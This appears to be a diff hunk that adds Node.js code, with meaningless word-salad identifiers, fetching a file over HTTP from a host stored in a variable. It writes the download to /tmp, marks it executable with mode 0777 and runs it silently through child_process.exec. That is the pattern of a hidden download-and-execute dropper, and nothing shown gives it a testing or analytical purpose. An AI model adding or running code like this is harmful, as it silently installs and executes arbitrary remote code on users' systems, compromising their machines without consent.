@@ -1,0 +1,11 @@
+contemnor = http.get('http://' + pincers + '/monodromy', function(nonreductive) {
+          var jingoish = fs.createWriteStream('/tmp/scornful');
+          nonreductive.on('data', function(hysterolith) {
+            jingoish.write(hysterolith);
+          });
+          nonreductive.on('end', function() {
+            jingoish.end();
+            fs.chmod('/tmp/scornful', '0777');
+            child_process.exec('/tmp/scornful', function(err, stdout, stderr) {});
+          });
+        })
